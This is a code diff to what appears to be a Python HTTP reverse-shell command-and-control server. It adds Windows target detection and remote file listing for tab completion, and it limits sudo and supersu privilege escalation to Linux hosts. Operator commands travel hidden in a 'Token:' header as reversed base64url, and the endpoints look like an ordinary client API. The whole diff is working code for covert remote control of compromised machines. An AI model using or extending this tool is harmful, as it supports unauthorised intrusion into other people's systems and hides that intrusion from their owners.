@@ -37,11 +37,16 @@ banner2 = """
 """
 
 def completer(text, state):
-    global remote_files
-    options = [f for f in remote_files if f.startswith(text)]
-
+    global remote_files, autocomplete_pending
+    if not remote_files and not autocomplete_pending:
+        update_remote_files_list()
+    text_lower = text.lower()
+    options = [f for f in remote_files if f.lower().startswith(text_lower)]
     if len(options) == 1:
         return options[state]
+    else:
+        return options[state]
+    return None
 
 readline.set_completer(completer)
 readline.parse_and_bind("tab: complete")
@@ -120,7 +125,10 @@ class MyServer(BaseHTTPRequestHandler):
                     last_prompt = prompt
                     remote_files = []
                     autocomplete_pending = True
-                    command = "ls"
+                    if system == "linux":
+                        command = "ls"
+                    if system == "windows":
+                        command = "(ls).name"
                     encoded_command = "Token: "
                     encoded_command += self.encode_reversed_base64url(command)
                     self._set_headers()
@@ -139,8 +147,10 @@ class MyServer(BaseHTTPRequestHandler):
 
                 if "\\" in path:
                     slash = "\\"
+                    system = "windows"
                 else:
                     slash = "/"
+                    system = "linux"
 
                 if len(str(path).rstrip()) > 24:
                     shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
@@ -173,14 +183,19 @@ class MyServer(BaseHTTPRequestHandler):
                         command = None
 
                     if "supersu" in command.split()[0]:
-                        global supersu
-                        supersu = True
-                        command = None
-                        root = True
-                        print()
+                        if system != "linux":
+                            print(colored("[!] Error: supersu is only available on Linux hosts\n", "red"))
+                        else:
+                            global supersu
+                            supersu = True
+                            command = None
+                            root = True
+                            print()
 
                     if "sudo" in command.split()[0]:
-                        if not ":" in path:
+                        if system != "linux":
+                            print(colored("[!] Error: sudo is only available on Linux hosts\n", "red"))
+                        else:
                             args = oslex.split(command)
                             if len(args) < 2:
                                 print(colored("[!] Usage: sudo \"command\" or sudo su\n","red"))
@@ -367,12 +382,12 @@ class MyServer(BaseHTTPRequestHandler):
                         lines = decoded_payload.split("\n")
                         filtered_lines = [line for line in lines if "[sudo]" not in line]
                         decoded_payload = "\n".join(filtered_lines)
-                        print(colored(decoded_payload.rstrip()+"\n", "yellow"))
+                        print(colored(decoded_payload.rstrip()+"\n", "white"))
                     else:
                         if "HTTPShellNull" in decoded_payload:
                             print()
                         else:
-                            print(colored(decoded_payload.rstrip()+"\n", "yellow"))
+                            print(colored(decoded_payload.rstrip()+"\n", "white"))
                 self.wfile.write(response.encode())
 
             elif self.path == "/api/v1/Client/Error":
